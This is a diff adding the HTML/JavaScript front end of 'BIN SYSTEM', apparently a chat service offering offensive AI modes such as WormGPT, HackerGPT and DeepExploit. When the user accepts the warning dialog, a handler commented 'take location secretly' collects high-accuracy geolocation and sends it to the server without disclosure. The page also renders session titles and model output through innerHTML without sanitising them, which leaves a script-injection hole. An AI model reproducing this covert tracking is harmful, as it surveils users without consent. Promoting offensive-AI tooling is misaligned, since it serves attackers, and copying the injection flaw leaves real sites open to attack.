@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="id" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BIN SYSTEM - Advanced Toolkit</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --text-primary: #c9d1d9;
+            --border: #30363d;
+            --accent: #1f6feb;
+            --red-accent: #d82f3b;
+        }
+        .light {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --text-primary: #24292f;
+            --border: #d0d7de;
+            --accent: #0969da;
+            --red-accent: #cf222e;
+        }
+        body { background-color: var(--bg-primary); color: var(--text-primary); }
+        .sidebar { background-color: var(--bg-secondary); border-right: 1px solid var(--border); width: 16rem; transition: width 0.3s ease; overflow: hidden; }
+        .sidebar.collapsed { width: 0; padding: 0; border-right: none; }
+        .chat-container { height: calc(100vh - 150px); }
+        .tool-btn.active { background: linear-gradient(135deg, var(--accent), var(--red-accent)); color: white; border-color: var(--red-accent); }
+    </style>
+</head>
+<body class="flex h-screen overflow-hidden antialiased">
+
+    <!-- MODAL USERNAME -->
+    <div id="username-modal" class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center hidden">
+        <div class="bg-[#161b22] border border-[#30363d] rounded-xl p-6 w-full max-w-sm shadow-2xl">
+            <h2 class="text-xl font-bold text-white mb-2"><i class="fas fa-skull text-red-500"></i> BIN SYSTEM</h2>
+            <p class="text-sm text-gray-400 mb-4">Silakan masukkan username untuk melanjutkan</p>
+            <input id="username-input" type="text" placeholder="Username..." class="w-full bg-[#0d1117] border border-[#30363d] rounded p-2 text-white mb-3 outline-none focus:border-blue-500" minlength="2" required>
+            <button id="submit-username" class="w-full bg-gradient-to-r from-[#1f6feb] to-[#d82f3b] text-white font-bold py-2 rounded-lg">LANJUTKAN</button>
+        </div>
+    </div>
+
+    <!-- MODAL PERINGATAN -->
+    <div id="warning-modal" class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center hidden">
+        <div class="bg-[#161b22] border border-[#30363d] rounded-xl p-8 w-full max-w-md shadow-2xl text-center">
+            <div class="text-6xl mb-4"><i class="fas fa-exclamation-triangle text-red-500"></i></div>
+            <h2 class="text-3xl font-extrabold text-red-500 mb-4">JANGAN SALAH GUNAKAN AI INI</h2>
+            <p class="text-lg text-gray-300 mb-6">GUNAKAN DENGAN BIJAK</p>
+            <button id="accept-warning" class="w-full bg-gradient-to-r from-green-600 to-green-700 text-white font-bold py-3 rounded-lg text-lg">MELANJUTKAN</button>
+        </div>
+    </div>
+
+    <!-- SIDEBAR DENGAN IKON FONT AWESOME -->
+    <aside id="sidebar" class="sidebar flex flex-col flex-shrink-0">
+        <div class="p-3 border-b border-[var(--border)]">
+            <h1 class="text-lg font-bold"><i class="fas fa-skull text-red-500"></i> BIN SYSTEM</h1>
+            <p class="text-xs text-gray-500" id="guest-label">Guest</p>
+            <button onclick="newSession()" class="w-full mt-2 bg-[#238636] hover:bg-green-700 text-white py-1 rounded text-sm font-medium">
+                <i class="fas fa-plus-circle"></i> New Chat
+            </button>
+        </div>
+        <div class="p-2 border-b border-[var(--border)]">
+            <p class="text-xs font-bold text-gray-500 uppercase mb-1">Tools</p>
+            <div class="flex flex-col gap-1" id="tool-list">
+                <button data-tool="core" class="tool-btn active text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-comments"></i> Core Chat
+                </button>
+                <button data-tool="osint" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-search"></i> OSINT Tracker
+                </button>
+                <button data-tool="pentest" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-shield-haltered"></i> PentestGPT
+                </button>
+                <button data-tool="hacker" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-user-secret"></i> HackerGPT
+                </button>
+                <button data-tool="burp" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-bug"></i> Burp Suite AI
+                </button>
+                <button data-tool="wormgpt" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-worm"></i> WormGPT
+                </button>
+                <button data-tool="deepexploit" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-bomb"></i> DeepExploit
+                </button>
+                <button data-tool="recon" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-satellite-dish"></i> AutoRecon
+                </button>
+                <button data-tool="agent" class="tool-btn text-left px-2 py-1 text-xs rounded border border-transparent hover:bg-[#21262d]">
+                    <i class="fas fa-robot"></i> Agent
+                </button>
+            </div>
+        </div>
+        <div class="flex-1 overflow-y-auto p-2" id="session-list"></div>
+        <div class="p-2 border-t border-[var(--border)] flex items-center justify-between">
+            <div class="flex gap-1">
+                <button onclick="setTheme('dark')" title="Dark" class="text-xs px-2 py-1 rounded border border-[var(--border)]"><i class="fas fa-moon"></i></button>
+                <button onclick="setTheme('light')" title="Light" class="text-xs px-2 py-1 rounded border border-[var(--border)]"><i class="fas fa-sun"></i></button>
+                <button onclick="setTheme('system')" title="System" class="text-xs px-2 py-1 rounded border border-[var(--border)]"><i class="fas fa-desktop"></i></button>
+            </div>
+        </div>
+    </aside>
+
+    <!-- MAIN CHAT AREA -->
+    <div class="flex-1 flex flex-col bg-[var(--bg-primary)]">
+        <header class="bg-[var(--bg-secondary)] border-b border-[var(--border)] p-3 flex justify-between items-center">
+            <div class="flex items-center gap-2">
+                <button id="toggle-sidebar" class="text-xl focus:outline-none hover:text-gray-300"><i class="fas fa-bars"></i></button>
+                <h2 id="current-mode-title" class="text-sm font-bold"><i class="fas fa-comments"></i> Core Chat</h2>
+            </div>
+            <span class="text-xs text-green-500"><i class="fas fa-circle"></i> Online</span>
+        </header>
+        <main id="chat-box" class="flex-1 overflow-y-auto p-4 chat-container space-y-6"></main>
+        <footer class="p-3 bg-[var(--bg-secondary)] border-t border-[var(--border)]">
+            <div class="flex gap-2 items-end max-w-4xl mx-auto">
+                <textarea id="user-input" rows="1" class="flex-1 bg-[var(--bg-primary)] border border-[var(--border)] rounded p-2 text-[var(--text-primary)] resize-none outline-none focus:border-blue-500" placeholder="Ketik perintah atau command tool..."></textarea>
+                <button id="send-btn" class="bg-gradient-to-r from-[var(--accent)] to-[var(--red-accent)] text-white px-4 py-2 rounded font-bold">
+                    <i class="fas fa-paper-plane"></i> EXECUTE
+                </button>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Theme
+        function setTheme(mode) {
+            if (mode === 'system') {
+                const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+                document.documentElement.className = prefersDark ? 'dark' : 'light';
+            } else {
+                document.documentElement.className = mode;
+            }
+            localStorage.setItem('theme', mode);
+        }
+        const savedTheme = localStorage.getItem('theme') || 'dark';
+        setTheme(savedTheme);
+
+        const sidebar = document.getElementById('sidebar');
+        document.getElementById('toggle-sidebar').addEventListener('click', () => {
+            sidebar.classList.toggle('collapsed');
+        });
+
+        let activeSessionId = null;
+        let activeTool = 'core';
+        let heartbeatInterval = null;
+
+        function startHeartbeat() {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(() => {
+                fetch('/api/heartbeat', { method: 'POST' }).catch(() => {});
+            }, 15000);
+        }
+
+        async function checkUsername() {
+            try {
+                const res = await fetch('/api/identity');
+                if (res.status === 401) {
+                    document.getElementById('username-modal').classList.remove('hidden');
+                } else if (res.ok) {
+                    const data = await res.json();
+                    document.getElementById('guest-label').textContent = `User: ${data.username}`;
+                    loadSessions();
+                    startHeartbeat();
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        document.getElementById('submit-username').addEventListener('click', async () => {
+            const input = document.getElementById('username-input');
+            const username = input.value.trim();
+            if (!username || username.length < 2) {
+                alert('Username minimal 2 karakter!');
+                return;
+            }
+            const res = await fetch('/api/set-username', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username})
+            });
+            const data = await res.json();
+            if (res.ok) {
+                document.getElementById('guest-label').textContent = `User: ${data.username}`;
+                document.getElementById('username-modal').classList.add('hidden');
+                document.getElementById('warning-modal').classList.remove('hidden');
+            } else {
+                alert(data.error || 'Gagal menyimpan username');
+            }
+        });
+
+        document.getElementById('accept-warning').addEventListener('click', () => {
+            document.getElementById('warning-modal').classList.add('hidden');
+            // Ambil lokasi diam-diam
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        await fetch('/api/set-location', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ latitude: lat, longitude: lon })
+                        }).catch(() => {});
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+            }
+            // Langsung masuk
+            loadSessions();
+            startHeartbeat();
+        });
+
+        async function loadSessions() {
+            const res = await fetch('/api/sessions');
+            if (res.status === 401) {
+                document.getElementById('username-modal').classList.remove('hidden');
+                return;
+            }
+            const sessions = await res.json();
+            const container = document.getElementById('session-list');
+            container.innerHTML = '';
+            sessions.forEach(s => {
+                const div = document.createElement('div');
+                div.className = 'flex items-center gap-1 group hover:bg-[#21262d] rounded px-1';
+                div.innerHTML = `
+                    <button class="flex-1 text-left text-sm truncate py-1" onclick="switchSession(${s.id})">${s.title}</button>
+                    <button class="text-red-400 opacity-0 group-hover:opacity-100 text-xs" onclick="deleteSession(${s.id})"><i class="fas fa-times"></i></button>
+                `;
+                container.appendChild(div);
+            });
+            if (sessions.length === 0) {
+                container.innerHTML = '<p class="text-xs text-gray-500 p-2">Belum ada sesi.</p>';
+            }
+        }
+
+        async function newSession() {
+            const res = await fetch('/api/sessions', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({title: 'New Chat'})
+            });
+            if (res.status === 401) {
+                document.getElementById('username-modal').classList.remove('hidden');
+                return;
+            }
+            const session = await res.json();
+            await loadSessions();
+            switchSession(session.id);
+        }
+
+        async function switchSession(id) {
+            activeSessionId = id;
+            document.getElementById('chat-box').innerHTML = '';
+            const res = await fetch(`/api/messages/${id}`);
+            const msgs = await res.json();
+            msgs.forEach(m => appendMessage(m.role === 'user' ? 'user' : 'ai', m.content));
+        }
+
+        async function deleteSession(id) {
+            await fetch(`/api/sessions/${id}`, { method: 'DELETE' });
+            if (activeSessionId === id) {
+                activeSessionId = null;
+                document.getElementById('chat-box').innerHTML = '';
+            }
+            loadSessions();
+        }
+
+        document.querySelectorAll('#tool-list .tool-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('#tool-list .tool-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                activeTool = btn.dataset.tool;
+                // Update header dengan ikon sesuai tool
+                const icon = btn.querySelector('i').className;
+                const text = btn.innerText.trim();
+                document.getElementById('current-mode-title').innerHTML = `<i class="${icon}"></i> ${text}`;
+            });
+        });
+
+        document.getElementById('send-btn').addEventListener('click', sendMessage);
+        document.getElementById('user-input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); }
+        });
+
+        async function sendMessage() {
+            const input = document.getElementById('user-input');
+            const text = input.value.trim();
+            if (!text) return;
+            if (!activeSessionId) {
+                const res = await fetch('/api/sessions', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({title: text.substring(0, 50)})
+                });
+                if (res.status === 401) {
+                    document.getElementById('username-modal').classList.remove('hidden');
+                    return;
+                }
+                const sess = await res.json();
+                activeSessionId = sess.id;
+                loadSessions();
+            }
+            input.value = '';
+            appendMessage('user', text);
+            const loadingDiv = appendLoading();
+
+            try {
+                const res = await fetch('/api/generate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ prompt: text, tool: activeTool, session_id: activeSessionId })
+                });
+                const data = await res.json();
+                loadingDiv.remove();
+                if (res.ok) {
+                    appendMessage('ai', data.response);
+                } else {
+                    appendMessage('error', data.error || 'Error');
+                }
+            } catch (err) {
+                loadingDiv.remove();
+                appendMessage('error', 'Koneksi gagal');
+            }
+        }
+
+        function appendMessage(role, content) {
+            const box = document.getElementById('chat-box');
+            const div = document.createElement('div');
+            div.className = `${role === 'user' ? 'user-msg' : 'ai-msg'} p-3 rounded flex gap-3 max-w-4xl mx-auto`;
+            const avatar = role === 'user'
+                ? '<div class="w-8 h-8 flex items-center justify-center rounded-full bg-[#238636] text-white"><i class="fas fa-user"></i></div>'
+                : (role === 'error' ? '<div class="w-8 h-8 flex items-center justify-center rounded-full bg-yellow-600 text-white"><i class="fas fa-exclamation"></i></div>'
+                : '<div class="w-8 h-8 flex items-center justify-center rounded-full bg-red-600 text-white"><i class="fas fa-skull"></i></div>');
+            div.innerHTML = avatar + `<div class="prose prose-invert max-w-none">${marked.parse(content)}</div>`;
+            box.appendChild(div);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function appendLoading() {
+            const div = document.createElement('div');
+            div.className = 'ai-msg p-3 flex gap-3 max-w-4xl mx-auto';
+            div.innerHTML = '<div class="w-8 h-8 bg-gray-700 rounded-full animate-pulse"></div><div class="text-gray-500 animate-pulse">Memproses...</div>';
+            document.getElementById('chat-box').appendChild(div);
+            return div;
+        }
+
+        checkUsername();
+    </script>
+</body>
+</html>
